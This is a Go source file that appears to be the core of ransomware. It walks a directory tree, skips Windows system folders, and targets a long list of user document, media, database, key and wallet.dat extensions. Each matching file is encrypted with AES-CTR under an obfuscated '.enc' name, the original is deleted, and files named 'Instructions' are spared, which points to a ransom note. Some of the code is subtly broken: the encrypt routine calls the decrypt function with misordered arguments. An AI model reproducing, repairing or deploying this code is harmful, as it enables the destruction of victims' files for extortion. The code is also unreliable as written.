package encrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"errors"
	"fmt"
	"github.com/autom8ter/gocrypt/utils"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
)

type EncryptMode int

const (
	ENCRYPT EncryptMode = iota
	DECRYPT
)

// EncryptDocumets Walks documments in a path and encript or decrypts them.
func EncryptDocuments(myKey []byte, path string, mode EncryptMode) error {
	block, err := aes.NewCipher(myKey)
	if err != nil {
		return fmt.Errorf("failed to inititialize block with key: %s\n%s", string(myKey), err.Error())
	}
	if block == nil {
		return errors.New("Need to Initialize Block first. Call: InitializeBlock(myKey []byte)")
	}
	switch mode {
	case ENCRYPT:
		return filepath.Walk(path, EncryptFunc(block))
	case DECRYPT:
		return filepath.Walk(path, DecryptFunc(block))
	default:
		log.Fatalf("unknown encryption mode: %v", mode)
	}
	return nil
}

func EncryptFunc(block cipher.Block) filepath.WalkFunc {
	return func(path string, f os.FileInfo, err error) error {
		for _, folder := range BadFolders() {
			if strings.Contains(path, folder) {
				return nil
			}
		}
		if !strings.Contains(path, Ext) && !strings.Contains(path, "Instructions") {
			for _, ext := range Extensions() {
				if strings.Contains(path, ext) {
					return StreamDecrypter(block, path)
				}
			}
		}
		return nil
	}
}

func DecryptFunc(block cipher.Block) filepath.WalkFunc {
	return func(path string, f os.FileInfo, err error) error {
		if strings.Contains(path, Ext) && !f.IsDir() {
			return StreamDecrypter(block, path)
		}
		return nil
	}
}
func BadFolders() []string {
	return []string{"tmp", "winnt", "Application Data", "AppData",
		"Program Files (x86)", "Program Files", "temp", "thumbs.db", "Recycle.Bin",
		"System Volume Information", "Boot", "Windows",
	}
}

func Extensions() []string {
	return []string{".mp4", ".avi", ".mp3", ".jpg", ".odt", ".mid", ".wma", ".flv",
		".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf",
		".wav", ".qcow2", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tbk", ".bak", ".djv",
		".djvu", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif",
		".tiff", ".NEF", ".psd", ".cmd", ".bat", ".class", ".java", ".asp", ".brd",
		".sch", ".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf",
		".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB",
		".SQLITE3", ".asc", ".lay6", ".lay", ".ms11", ".sldm", ".sldx", ".ppsm",
		".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".odg", ".uop", ".potx",
		".potm", ".pptx", ".pptm", ".std", ".sxd", ".pot", ".pps", ".sti", ".sxi",
		".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".slk",
		".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc", ".ots", ".ods", ".hwp",
		".dotm", ".dotx", ".docm", ".docx", ".DOT", ".max", ".xml", ".txt", ".CSV",
		".uot", ".RTF", ".pdf", ".XLS", ".PPT", ".stw", ".sxw", ".ott", ".odt",
		".DOC", ".pem", ".csr", ".crt", ".key", "wallet.dat",
	}
}

// Ext is the encrypted appended extension
var Ext = ".enc"

func initIV(block cipher.Block) (stream cipher.Stream, iv []byte) {
	iv = make([]byte, aes.BlockSize)
	_, err := rand.Read(iv)
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	stream = cipher.NewCTR(block, iv[:])
	return stream, iv
}

func initWithIV(block cipher.Block, myIv []byte) cipher.Stream {
	return cipher.NewCTR(block, myIv[:])
}

// StreamEncrypter encrypts a file given its filepatth
func StreamEncrypter(path string, block cipher.Block) (err error) {
	inFile, err := os.Open(path)
	if err != nil {
		fmt.Println(err)
		return
	}

	obfuscatePath := utils.FilenameObfuscator(path, Ext)
	outFile, err := os.OpenFile(obfuscatePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)
	fmt.Println(outFile.Name())

	if err != nil {
		fmt.Println(err)
		return
	}

	stream, iv := initIV(block)
	outFile.Write(iv)
	writer := &cipher.StreamWriter{S: stream, W: outFile}

	if _, err = io.Copy(writer, inFile); err != nil {
		fmt.Println(err.Error())
	}
	inFile.Close()
	outFile.Close()
	os.Remove(path)
	return nil
}

// StreamDecrypter decryps a file given its filepath
func StreamDecrypter(block cipher.Block, path string) (err error) {
	inFile, err := os.Open(path)
	if err != nil {
		fmt.Println("error:", err)
		return
	}

	deobfPath := utils.FilenameDeobfuscator(path, Ext)
	outFile, err := os.OpenFile(deobfPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)
	if err != nil {
		return
	}

	iv := make([]byte, aes.BlockSize)
	io.ReadFull(inFile, iv[:])
	stream := initWithIV(block, iv)
	inFile.Seek(aes.BlockSize, 0) // Read after the IV

	reader := &cipher.StreamReader{S: stream, R: inFile}
	if _, err = io.Copy(outFile, reader); err != nil {
		fmt.Println(err)
	}
	inFile.Close()

	os.Remove(path)
	return
}
